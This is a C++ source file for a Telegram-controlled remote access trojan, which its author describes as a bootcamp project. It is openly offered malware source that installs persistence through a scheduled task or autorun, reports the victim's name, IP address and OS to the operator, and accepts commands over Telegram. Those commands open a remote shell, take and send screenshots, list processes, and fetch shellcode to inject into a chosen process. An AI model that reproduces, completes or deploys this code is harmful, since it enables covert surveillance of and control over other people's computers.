/*
    Telegram RAT
    Description: This is a project i did for the NEOLAND cybersecurity bootcamp, its buggy, bad, ugly and probably broken (but at least worked on the presentation)
    if you encounter any problem you can open an issue thread but probably i wont bother because im not going to continue with this project.
    Created by: omarDans 
*/

#include <WinSock2.h>
#include <Windows.h>
#include <gdiplus.h>

#include <tgbot/tgbot.h>

#include <stdio.h>
#include <filesystem>
#include <stdlib.h>
#include <string>
#include <vector>
#include <stdexcept>

#include "Information.h"
#include "shell.h"
#include "screen.h"
#include "ProcessManager.h"
#include "Requests.h"
#include "Utils.h"
#include "persistence.h"

#pragma comment(lib, "Gdiplus.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "User32.lib")
#pragma comment(lib, "Crypt32.lib")

#define SIZE 1024

using namespace TgBot;

HANDLE hInputWrite = NULL;
HANDLE hOutputRead = NULL;

int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR lpCmdLine, int nCmdShow) {
    std::string Astate;
    if (persistence::isFirstExecution()) {
        if (!Utilities::isUserAdmin()) {
        MessageBoxA(NULL, "Error: Execute with Admin privileges", "ERROR", MB_OK | MB_ICONERROR);
        return 0;
        }
        persistence::markInstalled();
        Astate = persistence::scheduleTsk("APPDATA");
        if (Astate.compare("Scheduled") != 0) {
            Astate = persistence::Autorun("APPDATA");
        }
        printf("First execution\n");
    }
    printf("Not first execution\n");
    
    TgBot::Bot bot("BOT-TOKEN"); // BOT TOKEN
    __int64 chatid =; // chat id here
    BOOL activated = false;
    BOOL continuar = true;
    BOOL injecting = false;
    DWORD pid;
    // WELCOME
    std::string IP = Information::GetIP();
    std::string information = "\n\nGlobal information: \nName: " + Information::GetPCName() + "\nIP: " + IP + "\nOS: " + Information::GetOS() + "\nAutorun: " + Astate + "\n\nTo send commands to this user, type: /activate " + IP;
    bot.getApi().sendMessage(chatid, "Hi, master!" + information);
    // COMMANDS
    // ACTIVATE MACHINE
    bot.getEvents().onCommand("activate", [&bot, &activated, &chatid, &IP](TgBot::Message::Ptr message) {
        std::string messageA = message->text;
        std::string ip = "";
        std::vector<std::string> option;
        option = Utilities::split(messageA, ' ');
        if (!option.empty()) {
            ip = option[1];
        }
        else {
            bot.getApi().sendMessage(chatid, "Error: usage /activate <ip>");
        }
        if (ip == IP || ip == "all") {
            activated = !activated;
            printf("activado!");
        }
        });
        // FOR CLEARING THE SHELL BUFFER (PROBABLY USELESS)
    bot.getEvents().onCommand("clearstdout", [&bot, &activated, &chatid](TgBot::Message::Ptr message) {
        if (!activated) {
            return;
        }
        shell::clearstdout(hOutputRead);
        bot.getApi().sendMessage(chatid, "Stdout Cleared!");
        });
    bot.getEvents().onUnknownCommand([&bot, &activated, &injecting, &pid](TgBot::Message::Ptr message) {
        if (!activated) {
            return;
        }
        // START SHELL
        std::string Pcommand = message->text.substr(1);
        if (StringTools::startsWith(Pcommand, "shell")) {
            PROCESS_INFORMATION pi;
            std::string output = shell::CreateShellProcess(pi, hInputWrite, hOutputRead);
            if (output.empty()) {
                bot.getApi().sendMessage(message->chat->id, "Failed to create shell :(");
                    return;
            }
            bot.getApi().sendMessage(message->chat->id, "shell created succesfully");
        }
        // TAKE SCREENSHOT
        else if (StringTools::startsWith(Pcommand, "screenshot")) {
            char* photoPath = Utilities::getFolder("TEMP");
            screen::Screenshot(photoPath);
            try {
                std::ifstream ifs(photoPath, std::ios::binary);
                std::stringstream buffer;
                buffer << ifs.rdbuf();

                TgBot::InputFile::Ptr inputFile = std::make_shared<TgBot::InputFile>();
                inputFile->data = buffer.str();
                inputFile->fileName = "image.jpg";

                bot.getApi().sendPhoto(message->chat->id, inputFile);
            }

            catch (const TgBot::TgException& e) {
                std::cerr << "Error: " << e.what() << std::endl;
            }
            try {
                if (std::filesystem::remove(photoPath))
                    std::cout << photoPath << " deleted\n";
                else
                    std::cout << "Error deleting file\n";
            }
            catch (const std::filesystem::filesystem_error& err) {
                std::cout << "Error: " << err.what() << std::endl;
            }
        }
        // PROCESS COMMANDS
        else if (StringTools::startsWith(Pcommand, "process")) {
            std::vector<std::string> params;
            params = Utilities::split(message->text, ' ');
            if (!params[1].c_str()) {
                bot.getApi().sendMessage(message->chat->id, "You didnt provide an argument");
            }
            // INJECT SHELLCODE
            if (params[1] == "inject_shell") {
                pid = ProcessManager::PidByName(params[2]);
                if (pid != 0) {
                    injecting = true;
                    bot.getApi().sendMessage(message->chat->id, "Targeting: " + params[2]);
                }
                else {
                    bot.getApi().sendMessage(message->chat->id, "Error getting PID");
                }
            }
            // LIST PROCESSES
            else if (params[1] == "list") {
                std::string processes = ProcessManager::ProcessList();
                if (processes != "") {
                    bot.getApi().sendMessage(message->chat->id, processes.c_str());
                }
                else {
                    bot.getApi().sendMessage(message->chat->id, "Something went wrong...");
                }
            }
        }
        });
    bot.getEvents().onNonCommandMessage([&bot, &activated, &injecting, &pid, &chatid](TgBot::Message::Ptr message) {
        if (!activated) {
            return;
        }
        // SECOND PART OF "inject_shell" COMAND, HERE YOU PROBIDE THE .BIN FILE WITH THE SHELLCODE YOU WANT TO INJECT
        if (injecting) {
            if (message->document) {
                std::string fileId = message->document->fileId;
                File::Ptr file = bot.getApi().getFile(fileId);
                std::string Url = "api.telegram.org";
                std::string path = "/file/bot" + bot.getToken() + "/" + file->filePath;
                std::string shellcode = Requests::GetRequest(Url.c_str(), "4B4DB4B3", path.c_str());
                if (shellcode.length() > 0) {
                    if (ProcessManager::InjectShell(pid, shellcode)) {
                        bot.getApi().sendMessage(message->chat->id, "Shellcode injected");
                    }
                    else {
                        bot.getApi().sendMessage(message->chat->id, "Something failed");
                    }
                }
                return;
            }
        }
        if (hInputWrite == NULL || hOutputRead == NULL) {
            bot.getApi().sendMessage(chatid, "Shell not launched :(");
            return;
        }
        std::string output = shell::ExecuteCommand(hInputWrite, hOutputRead, message->text);
        if (output.empty()) {
            printf("Done!");
        }
        else {
            bot.getApi().sendMessage(message->chat->id, Utilities::to_utf8(output));
        }
        });
    try {
        printf("Bot username: %s\n", bot.getApi().getMe()->username.c_str());
        TgBot::TgLongPoll longPoll(bot);
        while (continuar) {
            printf("Long poll started\n");
            longPoll.start();
        }
    }
    catch (TgBot::TgException& e) {
        printf("error: %s\n", e.what());
    }
    return 0;
}